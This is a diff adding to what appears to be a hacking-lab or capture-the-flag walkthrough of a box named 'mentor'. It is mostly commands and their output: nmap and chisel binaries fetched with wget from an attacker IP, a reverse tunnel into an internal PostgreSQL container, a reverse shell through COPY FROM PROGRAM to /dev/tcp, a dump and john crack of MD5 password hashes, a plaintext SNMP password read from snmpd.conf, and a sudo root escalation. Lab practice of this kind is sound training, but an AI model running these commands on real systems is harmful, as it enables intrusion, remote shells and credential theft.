@@ -203,20 +203,174 @@ ip a
     link/ether 02:42:ac:16:00:03 brd ff:ff:ff:ff:ff:ff
     inet 172.22.0.3/16 brd 172.22.255.255 scope global eth0
        valid_lft forever preferred_lft forever
+
+
+cd /tmp
+wget 10.10.14.38/nmap
+chmod +x /tmp/nmap
 /tmp/nmap -sn 172.22.0.0/24
+
+Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-12-08 10:59 GMT
+Nmap scan report for 172.22.0.1
+Host is up (0.000045s latency).
+MAC Address: 02:42:D4:F7:85:87 (Unknown)
+Nmap scan report for docker_web_1.docker_vpcbr (172.22.0.2)
+Host is up (0.000027s latency).
+MAC Address: 02:42:AC:16:00:02 (Unknown)
+Nmap scan report for docker_postgres_1.docker_vpcbr (172.22.0.4)
+Host is up (0.000014s latency).
+MAC Address: 02:42:AC:16:00:04 (Unknown)
+Nmap scan report for ed049fda1a46 (172.22.0.3)
+Host is up.
+Nmap done: 256 IP addresses (4 hosts up) scanned in 16.71 seconds
+
+
+/tmp/nmap 172.22.0.4
+
+Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-12-08 11:00 GMT
+Nmap scan report for docker_postgres_1.docker_vpcbr (172.22.0.4)
+Host is up (0.000020s latency).
+Not shown: 1288 closed ports
+PORT     STATE SERVICE
+5432/tcp open  postgresql
+MAC Address: 02:42:AC:16:00:04 (Unknown)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.58 seconds
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ./chisel server -p 8001 -reverse -v
+2025/12/08 10:02:31 server: Reverse tunnelling enabled
+2025/12/08 10:02:31 server: Fingerprint T3p36uem1QuAGJpZKCph2j0+iehZvBoAWWqhRQsyiX0=
+2025/12/08 10:02:31 server: Listening on http://0.0.0.0:8001
+
+
+cd /tmp
+wget 10.10.14.38/chisel
+chmod +x /tmp/chisel
+./chisel client 10.10.14.38:8001 R:127.0.0.1:8002:172.22.0.4:5432
+
+
+
+2025/12/08 10:03:07 server: session#1: Handshaking with 10.10.11.193:56466...
+2025/12/08 10:03:07 server: session#1: Verifying configuration
+2025/12/08 10:03:07 server: session#1: tun: Created
+2025/12/08 10:03:07 server: session#1: tun: SSH connected
+2025/12/08 10:03:07 server: session#1: tun: proxy#R:127.0.0.1:8002=>172.22.0.4:5432: Listening
+2025/12/08 10:03:07 server: session#1: tun: Bound proxies
+
+
+
+DROP TABLE IF EXISTS cmd_exec;
+CREATE TABLE cmd_exec(cmd_output text);
+
+postgres=# COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.14.38/53 0>&1"';
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lnvp 53  
+listening on [any] 53 ...
+connect to [10.10.14.38] from (UNKNOWN) [10.10.11.193] 38856
+bash: cannot set terminal process group (52): Inappropriate ioctl for device
+bash: no job control in this shell
+postgres@96e44c569292:~/data$ 
+
+
+postgres@96e44c569292:~/data$ ls -lsa
+ls -lsa
+total 136
+ 4 drwx------ 20 postgres postgres  4096 Dec  8 10:53 .
+ 4 drwxr-xr-x  1 postgres postgres  4096 Nov 11  2022 ..
+ 4 drwx------  6 postgres postgres  4096 Nov 10  2022 base
+ 4 drwx------  2 postgres postgres  4096 Dec  8 10:54 global
+ 4 drwxr-xr-x  2 postgres root      4096 Nov 11  2022 pg_backup
+ 4 drwx------  2 postgres postgres  4096 Nov 10  2022 pg_commit_ts
+ 4 drwx------  2 postgres postgres  4096 Nov 10  2022 pg_dynshmem
+ 8 -rw-------  1 postgres postgres  4782 Jun  8  2022 pg_hba.conf
+ 4 -rw-------  1 postgres postgres  1636 Jun  8  2022 pg_ident.conf
+ 4 drwx------  4 postgres postgres  4096 Dec  8 11:13 pg_logical
+ 4 drwx------  4 postgres postgres  4096 Nov 10  2022 pg_multixact
+ 4 drwx------  2 postgres postgres  4096 Nov 10  2022 pg_notify
+ 4 drwx------  2 postgres postgres  4096 Nov 10  2022 pg_replslot
+ 4 drwx------  2 postgres postgres  4096 Nov 10  2022 pg_serial
+ 4 drwx------  2 postgres postgres  4096 Nov 10  2022 pg_snapshots
+ 4 drwx------  2 postgres postgres  4096 Dec  8 10:53 pg_stat
+ 4 drwx------  2 postgres postgres  4096 Dec  8 11:14 pg_stat_tmp
+ 4 drwx------  2 postgres postgres  4096 Nov 10  2022 pg_subtrans
+ 4 drwx------  2 postgres postgres  4096 Nov 10  2022 pg_tblspc
+ 4 drwx------  2 postgres postgres  4096 Nov 10  2022 pg_twophase
+ 4 -rw-------  1 postgres postgres     3 Jun  8  2022 PG_VERSION
+ 4 drwx------  3 postgres postgres  4096 Nov 10  2022 pg_wal
+ 4 drwx------  2 postgres postgres  4096 Nov 10  2022 pg_xact
+ 4 -rw-------  1 postgres postgres    88 Jun  8  2022 postgresql.auto.conf
+28 -rw-------  1 postgres postgres 28156 Jun  8  2022 postgresql.conf
+ 4 -rw-------  1 postgres postgres    36 Dec  8 10:53 postmaster.opts
+ 4 -rw-------  1 postgres postgres    94 Dec  8 10:53 postmaster.pid
+postgres@96e44c569292:~/data$ cd pg_backup 
+cd pg_backup
+
+
+postgres@96e44c569292:~/data/pg_backup$ ls
 ls
-nmap
+db_export.sql
+postgres@96e44c569292:~/data/pg_backup$ cat db_export.sql
 
 
-problem tunneling... skipping for now.
+COPY public.users (id, email, username, password) FROM stdin;
+1	james@mentorquotes.htb	james	7ccdcd8c05b59add9c198d492b36a503
+35	svc@mentorquotes.htb	service_acc	53f22d0dfa10dce7e29cd31f4f953fd8
+\.
 
 
 
 
 
+┌──(root㉿kali)-[/home/kali]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hash
+Using default input encoding: UTF-8
+Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+123meunomeeivani (?)     
+1g 0:00:00:00 DONE (2025-12-08 10:17) 1.162g/s 16678Kp/s 16678Kc/s 32171KC/s  fuckyooh21..*7¡Vamos!
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
 
 
+┌──(root㉿kali)-[/home/kali]
+└─# ssh svc@10.10.11.193   
+...
+svc@mentor:~$ 
 
+svc@mentor:~$ cat /etc/snmp/snmpd.conf
+...
+createUser bootstrap MD5 SuperSecurePassword123__ DES
+rouser bootstrap priv
+...
+
+svc@mentor:~$ su james
+Password: 
+james@mentor:/home/svc$ 
+
+
+james@mentor:/home/svc$ sudo -l
+Matching Defaults entries for james on mentor:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User james may run the following commands on mentor:
+    (ALL) /bin/sh
+james@mentor:/home/svc$ 
+
+
+james@mentor:/home/svc$ sudo /bin/sh -p
+# id
+uid=0(root) gid=0(root) groups=0(root)
 
 
 
